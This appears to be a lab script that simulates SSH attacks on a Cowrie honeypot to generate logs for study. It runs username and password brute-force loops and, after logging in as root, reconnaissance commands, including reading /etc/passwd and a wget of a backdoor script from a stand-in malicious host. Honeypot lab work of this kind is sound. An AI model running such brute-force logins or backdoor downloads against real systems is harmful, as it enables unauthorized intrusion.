#!/bin/bash
# author lutfi

# ============================================
# Lab 1: Cowrie Honeypot - Client Attack Script
# Purpose: Simulate SSH attacks on the honeypot
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
SERVER_IP="192.168.120.122"
HONEYPOT_PORT="2222"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Cowrie Honeypot Attack Simulation${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

print_info() {
    echo -e "${BLUE}[ATTACK]${NC} $1"
}

print_status() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

# Test connectivity first
echo -e "${YELLOW}Testing connection to ${SERVER_IP}:${HONEYPOT_PORT}...${NC}"
if ! nc -z -w 3 "$SERVER_IP" "$HONEYPOT_PORT" 2>/dev/null; then
    print_error "Cannot connect to ${SERVER_IP}:${HONEYPOT_PORT}"
    echo -e "${RED}Please check:${NC}"
    echo -e "  1. Is Cowrie running on server? ${YELLOW}ps aux | grep cowrie${NC}"
    echo -e "  2. Is port 2222 listening? ${YELLOW}netstat -tuln | grep 2222${NC}"
    echo -e "  3. Can you ping server? ${YELLOW}ping -c 3 ${SERVER_IP}${NC}"
    exit 1
fi
print_status "Connected to ${SERVER_IP}:${HONEYPOT_PORT}"
echo ""

# Attack 1: SSH connection with common usernames
print_info "Attack 1: Testing common SSH usernames..."
for user in root admin test user; do
    echo -e "${YELLOW}Trying username: ${user}${NC}"
    timeout 3 sshpass -p "password" ssh -o StrictHostKeyChecking=no -p "$HONEYPOT_PORT" "${user}@${SERVER_IP}" exit 2>/dev/null || true
    sleep 1
done
print_status "Username enumeration completed"

# Attack 2: Brute force with common passwords
print_info "Attack 2: Password brute force attack..."
for pass in password 123456 admin root; do
    echo -e "${YELLOW}Trying password: ${pass}${NC}"
    timeout 3 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$HONEYPOT_PORT" "root@${SERVER_IP}" exit 2>/dev/null || true
    sleep 1
done
print_status "Brute force attack completed"

# Attack 3: Successful login and commands
print_info "Attack 3: Simulating successful intrusion..."
echo -e "${YELLOW}Connecting to honeypot and running commands...${NC}"

# Create a script to run inside SSH session
timeout 10 sshpass -p "password" ssh -o StrictHostKeyChecking=no -p "$HONEYPOT_PORT" "root@${SERVER_IP}" << 'EOSSH' 2>/dev/null || true
whoami
pwd
ls -la
cat /etc/passwd
uname -a
ifconfig
wget http://malicious-site.example.com/backdoor.sh
exit
EOSSH

print_status "Intrusion simulation completed"

# Attack 4: Multiple rapid connections
print_info "Attack 4: Rapid connection attempts..."
for i in {1..5}; do
    timeout 2 ssh -o StrictHostKeyChecking=no -p "$HONEYPOT_PORT" "user@${SERVER_IP}" exit 2>/dev/null &
done
wait
print_status "Rapid connection test completed"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  Attack Simulation Complete${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${RED}All attacks have been logged by Cowrie!${NC}"
echo ""
echo -e "On server, view logs with:"
echo -e "  ${YELLOW}./01-cowrie/analyze-logs.sh${NC}"
echo ""
echo -e "Or view raw logs:"
echo -e "  ${YELLOW}tail -f ~/cowrie/var/log/cowrie/cowrie.log${NC}"
echo ""
